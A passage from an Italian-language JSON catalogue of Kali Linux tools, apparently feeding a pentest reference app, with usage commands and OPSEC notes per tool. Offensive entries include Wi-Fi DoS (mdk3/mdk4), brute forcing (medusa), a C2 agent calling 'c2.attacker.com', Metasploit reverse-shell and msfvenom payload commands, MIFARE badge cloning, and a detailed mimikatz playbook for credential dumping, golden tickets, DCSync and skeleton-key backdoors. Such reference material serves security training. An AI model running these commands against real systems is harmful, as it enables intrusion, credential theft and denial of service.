    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>MCP Kali Server implementa il Model Context Protocol per integrare tool Kali Linux con Large Language Models. Permette a AI assistant di eseguire tool di security, analizzare output, e guidare penetration test in modo conversazionale e assistito.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>MCP Protocol:</strong> Integrazione standard con LLM.</p><p><strong>Tool Execution:</strong> Esegue tool Kali via AI.</p><p><strong>Context Aware:</strong> AI comprende output.</p><p><strong>Conversational:</strong> Pentest guidato da chat.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia MCP server\nmcp-kali-server\n\n# Configura client MCP (Claude, etc.)\n# L'AI può ora richiedere:\n\"Run nmap scan on 192.168.1.1\"\n\"Enumerate SMB shares on target\"\n\"Search for vulnerabilities on port 80\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AI-Assisted Pentest</strong>, guida conversazionale. Nel <strong>Learning</strong>, AI spiega ogni step. <strong>Automation</strong> di workflow di security.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Come tool sottostanti:</strong> AI può lanciare scan attivi. Verificare sempre prima di eseguire. Output può contenere dati sensibili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "06_Miscellaneous",
      "AI_MCP"
    ],
    "notes": null
  },
  {
    "id": "mdk3",
    "name": "mdk3",
    "version": "6.0",
    "icon": "../app/icons/mdk3-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mdk3/",
    "desc": "Exploit WiFi per beacon flooding, authentication DoS e SSID bruteforce.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>MDK3 è un tool per exploitation e stress testing di reti WiFi. Include attacchi come beacon flooding (fake AP), authentication DoS, deauthentication, SSID bruteforce, e altri. Utile per testare resilienza di access point e sistemi WIDS.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Beacon Flood:</strong> Crea migliaia di fake AP.</p><p><strong>Auth DoS:</strong> Sovraccarica AP con richieste.</p><p><strong>Deauth:</strong> Disconnette client da AP.</p><p><strong>SSID Bruteforce:</strong> Trova SSID nascosti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Beacon flooding (fake AP)\nmdk3 wlan0 b -f ssid_list.txt\n\n# Authentication DoS\nmdk3 wlan0 a -a 00:11:22:33:44:55\n\n# Deauthentication attack\nmdk3 wlan0 d -b blacklist.txt\n\n# SSID bruteforce\nmdk3 wlan0 p -f ssid_wordlist.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Wireless Testing</strong>, stress test di AP. Nel <strong>WIDS Testing</strong>, verifica detection capability. <strong>Research</strong> su vulnerabilità WiFi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Illegale:</strong> DoS è reato se non autorizzato. Disturba reti circostanti. Facilmente rilevabile da WIDS. Solo in lab controllato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "mdk4",
    "name": "mdk4",
    "version": "4.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mdk4/",
    "desc": "Evoluzione di mdk3 con attacchi WiFi moderni: PMKID, 802.11w bypass, WPA3 DoS.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>MDK4 è l'evoluzione di MDK3 con supporto per attacchi WiFi moderni. Include bypass di 802.11w (Protected Management Frames), attacchi su WPA3, PMKID capture, e miglioramenti a tutti gli attacchi legacy. Mantiene compatibilità con funzioni MDK3.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>802.11w Bypass:</strong> Supera PMF protection.</p><p><strong>WPA3 Attack:</strong> DoS e downgrade.</p><p><strong>PMKID:</strong> Cattura senza client.</p><p><strong>Legacy Support:</strong> Tutti gli attacchi MDK3.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Beacon flooding\nmdk4 wlan0 b -f ssids.txt -c 6\n\n# Deauth con 802.11w bypass\nmdk4 wlan0 d -B -c 6\n\n# Authentication DoS\nmdk4 wlan0 a -a 00:11:22:33:44:55\n\n# PMKID attack\nmdk4 wlan0 d -B -c 6 -a AP_MAC</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Modern WiFi Testing</strong>, test su WPA3 e PMF. Nel <strong>Security Research</strong>, studio di protezioni moderne. <strong>Red Team</strong> WiFi engagement.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Illegale:</strong> Come MDK3, DoS è reato. Può disabilitare reti critiche. Rilevabile da WIPS enterprise. Solo ambiente autorizzato.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "medusa",
    "name": "medusa",
    "version": "2.3",
    "icon": "../app/icons/medusa-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/medusa/",
    "desc": "Brute forcer parallelo e modulare per autenticazione su servizi di rete multipli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Medusa è un brute forcer parallelo, modulare e veloce per autenticazione di rete. Supporta molti protocolli inclusi SSH, FTP, HTTP, SMB, RDP, MySQL, PostgreSQL, VNC, e altri. Design modulare permette aggiunta di nuovi protocolli facilmente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Modular:</strong> Protocolli come moduli separati.</p><p><strong>Parallel:</strong> Thread multipli per velocità.</p><p><strong>Combo Files:</strong> Username:password preformattati.</p><p><strong>Resume:</strong> Riprende sessioni interrotte.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># SSH brute force\nmedusa -h target.com -u admin -P passwords.txt -M ssh\n\n# Con lista utenti\nmedusa -h target.com -U users.txt -P pass.txt -M ssh\n\n# FTP\nmedusa -h target.com -u admin -P pass.txt -M ftp\n\n# Multiple hosts\nmedusa -H hosts.txt -U users.txt -P pass.txt -M smb</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Password Audit</strong>, test di credenziali deboli. Nel <strong>Pentesting</strong>, brute force servizi. <strong>Security Assessment</strong> di policy password.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumoroso:</strong> Migliaia di login attempt. Account lockout. Facilmente rilevabile da IDS. Usare -t per limitare thread e -T per timeout.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Brute_Force"
    ],
    "notes": null
  },
  {
    "id": "memdump",
    "name": "memdump",
    "version": "1.01",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/memdump/",
    "desc": "Dump della memoria fisica di un sistema Linux per analisi forense e ricerca chiavi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Memdump crea un dump della memoria fisica (RAM) di un sistema Linux. Legge /dev/mem o /dev/fmem per estrarre contenuti della memoria. Utile in analisi forense per recuperare chiavi di crittografia, password in chiaro, e artefatti di processi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Physical Memory:</strong> Dump diretto da RAM.</p><p><strong>Fast:</strong> Acquisizione veloce.</p><p><strong>Raw Format:</strong> Output binario grezzo.</p><p><strong>Minimal Footprint:</strong> Tool leggero.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Dump memoria completa\nmemdump > memory.raw\n\n# Con offset e size\nmemdump -b 0x1000 -l 0x10000 > partial.raw\n\n# Analisi con strings\nstrings memory.raw | grep -i password\n\n# Con Volatility\nvol.py -f memory.raw linux_pslist</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Forensics</strong>, acquisizione memoria volatile. Nel <strong>Incident Response</strong>, cattura stato sistema live. <strong>Key Recovery</strong> per dischi criptati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Richiede root:</strong> Accesso privilegiato necessario. Kernel moderni limitano /dev/mem. Alternative: LiME, fmem. Non altera dati su disco.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Memory_Analysis"
    ],
    "notes": null
  },
  {
    "id": "merlin-agent",
    "name": "merlin-agent",
    "version": "2.4.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/merlin-agent/",
    "desc": "Agent cross-platform per C2 Merlin con comunicazione HTTP/2 e H2C.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Merlin Agent è il componente client del C2 framework Merlin. Scritto in Go per portabilità cross-platform (Windows, Linux, macOS). Comunica col server via HTTP/2 o H2C per traffico criptato e performante che si mimetizza come traffico web legittimo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Cross-platform:</strong> Win/Linux/macOS.</p><p><strong>HTTP/2:</strong> Comunicazione moderna e veloce.</p><p><strong>Encrypted:</strong> TLS per sicurezza.</p><p><strong>Modular:</strong> Carica moduli a runtime.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera agent da server Merlin\nmerlin> use module/payload/create\nmerlin> set PAYLOAD windows/x64/merlin\nmerlin> run\n\n# Esegui agent su target\n./merlin-agent -url https://c2.attacker.com:443\n\n# Agent si connette e appare in Merlin\nmerlin> sessions\nmerlin> interact SESSION_ID</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team</strong>, implant C2 su sistemi compromessi. Nel <strong>Pentesting</strong>, post-exploitation cross-platform. <strong>Persistence</strong> con beacon regolari.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Binary Go identificabile. HTTP/2 traffic analysis. EDR può rilevare comportamento. Signature dell'agent note.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "merlin",
    "name": "merlin",
    "version": "2.1.4",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/merlin/",
    "desc": "C2 server cross-platform in Go con HTTP/2 per comunicazioni criptate e performanti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Merlin è un C2 (Command and Control) framework cross-platform scritto in Go. Usa HTTP/2 per comunicazioni criptate ad alte prestazioni. Include server, agent per Win/Linux/macOS, e moduli per post-exploitation. Alternativa moderna a framework legacy.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>HTTP/2:</strong> Multiplexing e performance.</p><p><strong>Cross-platform:</strong> Server e agent portabili.</p><p><strong>Modular:</strong> Moduli PowerShell, shellcode, etc.</p><p><strong>CLI Interface:</strong> Console interattiva.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia server\nmerlin\n\n# Configura listener\nmerlin> use listener/http2\nmerlin> set Port 443\nmerlin> start\n\n# Genera agent\nmerlin> use module/payload/create\nmerlin> set OS windows\nmerlin> run\n\n# Interagisci con agent\nmerlin> sessions\nmerlin> interact 1</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team</strong>, C2 infrastructure moderna. Nel <strong>Pentesting</strong>, gestione di host compromessi. <strong>Training</strong> per operatori offensive security.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevabile:</strong> Pattern HTTP/2 identificabili. Certificate pinning consigliato. Traffic analysis può rivelare C2. Infra-red detection per pattern comunicazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "metagoofil",
    "name": "metagoofil",
    "version": "1.2.0",
    "icon": "../app/icons/metagoofil-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/metagoofil/",
    "desc": "Estrae metadati da documenti pubblici (PDF, DOC) per trovare username e software.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Metagoofil estrae metadati da documenti pubblici trovati via Google. Cerca PDF, DOC, XLS, PPT di un dominio target ed estrae username, path, software version, e altri metadati embedded. Informazioni utili per social engineering e attack surface mapping.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Google Search:</strong> Trova documenti del target.</p><p><strong>Multi-format:</strong> PDF, DOC, XLS, PPT, ODT.</p><p><strong>Metadata Extraction:</strong> Author, software, paths.</p><p><strong>Report:</strong> Output organizzato per tipo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca e analizza documenti\nmetagoofil -d target.com -t pdf,doc,xls -l 100 -o output/\n\n# Solo PDF\nmetagoofil -d target.com -t pdf -l 50 -o results/\n\n# Più risultati\nmetagoofil -d target.com -t pdf,doc -l 200 -n 50 -o out/\n\n# Output include:\n# - Username trovati\n# - Software versions\n# - Path interni</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT</strong>, scopre info su target da documenti. Nel <strong>Social Engineering</strong>, username per phishing. <strong>Attack Surface</strong> identifica software in uso.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passivo:</strong> Usa Google, non contatta target direttamente. Google può rate limit. Richiede tempo per molti documenti.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "metasploit-framework-kali",
    "name": "metasploit-framework",
    "version": "6.4.84",
    "icon": "../app/icons/metasploit-framework-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/metasploit-framework/",
    "desc": "Il framework di exploitation più famoso con migliaia di exploit, payload e moduli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Metasploit Framework è IL framework di exploitation più utilizzato al mondo. Include migliaia di exploit, payload, encoder, post-exploitation module. Fornisce msfconsole per operazioni interattive, msfvenom per payload generation, e integrazione con database per gestire engagement complessi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Exploits:</strong> 2000+ exploit per ogni piattaforma.</p><p><strong>Payloads:</strong> Meterpreter, shell, VNC, etc.</p><p><strong>Post-exploitation:</strong> Privilege escalation, pivoting.</p><p><strong>Database:</strong> Tracking di host, servizi, vulnerabilità.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia msfconsole\nmsfconsole\n\n# Cerca exploit\nmsf> search eternalblue\nmsf> use exploit/windows/smb/ms17_010_eternalblue\nmsf> set RHOSTS target.com\nmsf> set PAYLOAD windows/x64/meterpreter/reverse_tcp\nmsf> set LHOST attacker.com\nmsf> exploit\n\n# Genera payload\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe > shell.exe</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Pentesting</strong>, exploitation di vulnerabilità. Nel <strong>Red Team</strong>, post-exploitation completo. <strong>CTF</strong> per risolvere challenge.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Molto Rilevabile:</strong> Signature Metasploit note a tutti gli AV. Meterpreter detectato da EDR. Necessita evasion per ambienti protetti. Traffic pattern identificabili.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "mfcuk",
    "name": "mfcuk",
    "version": "0.3.8",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mfcuk/",
    "desc": "Cracca chiavi MIFARE Classic usando attacco darkside per card cloning RFID.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>MFCUK (MIFARE Classic Universal toolKit) cracca chiavi di card MIFARE Classic usando l'attacco darkside. Sfrutta una debolezza nel PRNG delle card per recuperare chiavi senza conoscerne nessuna. Primo step per clonare badge di accesso RFID.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Darkside Attack:</strong> Recupera chiavi da zero.</p><p><strong>No Known Keys:</strong> Non richiede chiavi note.</p><p><strong>PRNG Exploit:</strong> Sfrutta debolezza MIFARE.</p><p><strong>First Key:</strong> Ottiene prima chiave per nested attack.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Attacco darkside per ottenere prima chiave\nmfcuk -C -R 0 -s 250 -S 250\n\n# Output:\n# Found Key: FFFFFFFFFFFF (o altra chiave)\n\n# Poi usa mfoc per recuperare tutte le altre\nmfoc -O dump.mfd</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>RFID Security</strong>, test di badge aziendali. Nel <strong>Physical Pentesting</strong>, clonazione badge accesso. <strong>Research</strong> su sicurezza MIFARE.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Fisico:</strong> Richiede prossimità alla card. Lettore NFC necessario (ACR122U). Clonazione può essere illegale. Solo con autorizzazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "RFID_NFC"
    ],
    "notes": null
  },
  {
    "id": "mfoc",
    "name": "mfoc",
    "version": "0.10.7",
    "icon": "../app/icons/mfoc-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mfoc/",
    "desc": "Cracca MIFARE Classic con attacco nested authentication per recuperare tutte le chiavi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>MFOC (MIFARE Classic Offline Cracker) recupera tutte le chiavi di una card MIFARE Classic usando l'attacco nested authentication. Richiede almeno una chiave nota (default o ottenuta con mfcuk). Veloce nel recuperare tutte le chiavi dei 16 settori.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Nested Attack:</strong> Recupera chiavi da chiave nota.</p><p><strong>All Sectors:</strong> Ottiene chiavi di tutti i 16 settori.</p><p><strong>Full Dump:</strong> Crea dump completo della card.</p><p><strong>Fast:</strong> Attacco veloce e affidabile.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Dump card (usa chiavi default + nested)\nmfoc -O card_dump.mfd\n\n# Con chiave nota specifica\nmfoc -k FFFFFFFFFFFF -O dump.mfd\n\n# Probe tutte le chiavi default\nmfoc -P 500 -O dump.mfd\n\n# Il dump può essere scritto su card clone\nnfc-mfclassic w a blank.mfd dump.mfd</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Badge Cloning</strong>, crea copia di badge accesso. Nel <strong>Security Assessment</strong>, test di card aziendali. <strong>Data Recovery</strong> da card danneggiate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Fisico:</strong> Richiede accesso fisico alla card. Lettore NFC necessario. Clonazione badge senza autorizzazione è illegale.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "RFID_NFC"
    ],
    "notes": null
  },
  {
    "id": "mfterm",
    "name": "mfterm",
    "version": "1.0.7",
    "icon": "../app/icons/mfterm-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mfterm/",
    "desc": "Terminale interattivo per manipolazione card MIFARE: read, write, clone, format.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>MFTerm è un terminale interattivo per manipolazione di card MIFARE. Permette lettura, scrittura, clonazione e formattazione di card MIFARE Classic. Include gestione delle chiavi, editing esadecimale dei settori, e operazioni batch per manipolazione avanzata.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Interactive:</strong> Shell per operazioni su card.</p><p><strong>Read/Write:</strong> Accesso completo ai settori.</p><p><strong>Key Management:</strong> Gestione chiavi A e B.</p><p><strong>Hex Editor:</strong> Modifica dati raw.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia mfterm\nmfterm\n\n# Comandi interattivi:\nmfterm> load keys.mfd      # Carica chiavi\nmfterm> read a             # Leggi con chiave A\nmfterm> print              # Mostra contenuto\nmfterm> edit 1             # Modifica settore 1\nmfterm> write a            # Scrivi con chiave A\nmfterm> save output.mfd    # Salva dump</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Card Manipulation</strong>, modifica dati su badge. Nel <strong>Research</strong>, analisi struttura MIFARE. <strong>Data Recovery</strong> e backup di card.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Fisico:</strong> Accesso alla card necessario. Scrittura può rendere card inutilizzabile. Backup sempre prima di modifiche.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "RFID_NFC"
    ],
    "notes": null
  },
  {
    "id": "mimikatz-kali",
    "name": "mimikatz",
    "version": "2.2.0",
    "icon": "../app/icons/mimikatz-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mimikatz/",
    "desc": "Tool Windows per estrarre password, hash, ticket Kerberos e credenziali dalla memoria.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Mimikatz è IL tool per credential extraction su Windows. Estrae password in chiaro, hash NTLM, ticket Kerberos dalla memoria LSASS. Include funzioni per Pass-the-Hash, Pass-the-Ticket, Golden/Silver Ticket, DCSync e molte altre tecniche AD. Creato da gentilkiwi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>sekurlsa:</strong> Dump credenziali da LSASS.</p><p><strong>kerberos:</strong> Manipolazione ticket Kerberos.</p><p><strong>lsadump:</strong> DCSync, SAM dump.</p><p><strong>dpapi:</strong> Decrypt protezioni Windows.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === CREDENTIAL DUMPING ===\n# Dump credenziali live (richiede SYSTEM o debug priv)\nmimikatz# privilege::debug\nmimikatz# sekurlsa::logonpasswords\n\n# Dump da minidump LSASS (stealth - analisi offline)\n# Prima: procdump.exe -ma lsass.exe lsass.dmp\nmimikatz# sekurlsa::minidump lsass.dmp\nmimikatz# sekurlsa::logonpasswords\n\n# Dump SAM e SECURITY (local accounts)\nmimikatz# lsadump::sam\nmimikatz# lsadump::secrets\nmimikatz# lsadump::cache  # Cached domain credentials\n\n# === PASS-THE-HASH / PASS-THE-TICKET ===\n# PTH: spawn cmd con hash NTLM\nmimikatz# sekurlsa::pth /user:admin /domain:corp.local /ntlm:a87f3a337d73085c45f9416be5787d86 /run:cmd.exe\n\n# PTT: inject ticket in sessione corrente\nmimikatz# kerberos::ptt ticket.kirbi\n\n# === GOLDEN TICKET (Domain Persistence) ===\n# Richiede hash krbtgt (da DCSync)\nmimikatz# kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:a87f3a337d73085c45f9416be5787d86 /id:500 /groups:512,513,518,519,520 /ptt\n\n# === SILVER TICKET (Service-specific) ===\n# Accesso CIFS senza toccare DC\nmimikatz# kerberos::golden /user:FakeUser /domain:corp.local /sid:S-1-5-21-... /target:fileserver.corp.local /service:cifs /rc4:SERVICE_NTLM_HASH /ptt\n\n# === DCSYNC (Dump domain credentials remotely) ===\nmimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt\nmimikatz# lsadump::dcsync /domain:corp.local /all /csv  # Dump tutti gli hash\n\n# === DPAPI (Decrypt saved credentials) ===\n# Trova masterkeys\nmimikatz# dpapi::masterkey /in:\"C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-...\\masterkey\" /rpc\n# Decrypt Chrome passwords, saved credentials, etc.\nmimikatz# dpapi::chrome /in:\"C:\\Users\\victim\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" /unprotect\n\n# === SKELETON KEY (Domain Backdoor) ===\n# Inietta password master \"mimikatz\" su DC\nmimikatz# misc::skeleton\n# Ora qualsiasi user può autenticarsi con \"mimikatz\"\n\n# === ONE-LINER per automation ===\nmimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" > creds.txt\nmimikatz.exe \"lsadump::dcsync /domain:corp.local /user:Administrator\" \"exit\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD Exploitation</strong>, credential theft e lateral movement. Nel <strong>Pentesting</strong>, privilege escalation Windows. <strong>Red Team</strong> per domain dominance. <strong>DPAPI</strong> per recupero password salvate in browser e applicazioni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Molto Rilevabile:</strong> Signature nota a tutti gli AV/EDR. LSASS access genera Sysmon Event ID 10. DCSync genera Event ID 4662. Skeleton Key modifica LSASS in memoria. Per stealth: dump LSASS con metodi alternativi (comsvcs.dll, ProcDump) e analizza offline.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "miredo",
    "name": "miredo",
    "version": "1.2.6",
    "icon": "../app/icons/miredo-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/miredo/",
    "desc": "Client e server Teredo per tunneling IPv6 over UDP/IPv4 attraverso NAT.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Miredo è un'implementazione open-source del protocollo Teredo (RFC 4380). Permette tunneling IPv6 over UDP/IPv4 attraverso NAT, fornendo connettività IPv6 a host che non hanno supporto nativo. Include client, relay e server components.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Teredo Client:</strong> Ottiene IPv6 via tunnel.</p><p><strong>NAT Traversal:</strong> Funziona dietro NAT.</p><p><strong>UDP Encapsulation:</strong> IPv6 in pacchetti UDP.</p><p><strong>Auto-configuration:</strong> Setup automatico.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia client Teredo\nmiredo\n\n# Verifica interfaccia\nip addr show teredo\n\n# Test connettività IPv6\nping6 ipv6.google.com\n\n# Configurazione custom\nmiredo -c /etc/miredo/miredo.conf</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>IPv6 Access</strong>, connettività dove non disponibile nativamente. Nel <strong>Testing</strong>, test di servizi IPv6. <strong>Bypass</strong> di firewall solo IPv4.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Tunnel Traffic:</strong> UDP traffic identificabile. Server Teredo pubblici possono loggare. Latenza aggiunta rispetto a IPv6 nativo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "missidentify",
    "name": "missidentify",
    "version": "1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/missidentify/",
    "desc": "Trova eseguibili Windows rinominati o con estensione sbagliata in analisi forense.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Missidentify trova file Windows PE (eseguibili) che hanno estensione diversa da .exe o nome fuorviante. Utile in forensics per identificare malware mascherato, eseguibili rinominati per evasion, o file sospetti nascosti con estensioni innocue come .jpg o .txt.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>PE Detection:</strong> Identifica file PE indipendentemente dall'estensione.</p><p><strong>Recursive:</strong> Scansione di directory completa.</p><p><strong>Fast:</strong> Analisi basata su magic bytes.</p><p><strong>Report:</strong> Lista file sospetti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione directory\nmissidentify /path/to/scan\n\n# Ricorsiva\nmissidentify -r /evidence/\n\n# Solo file non-.exe\nmissidentify -r /evidence/ | grep -v \".exe$\"\n\n# Output su file\nmissidentify -r /mnt/evidence > suspicious.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Forensics</strong>, trova malware mascherato. Nel <strong>Incident Response</strong>, identifica file sospetti. <strong>Malware Hunting</strong> su immagini disco.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Read-only:</strong> Solo lettura dei file. Non modifica evidence. Veloce per grandi volumi di dati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "mitm6",
    "name": "mitm6",
    "version": "0.3.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mitm6/",
    "desc": "Sfrutta configurazione IPv6 di default in Windows per MITM e relay di credenziali.",
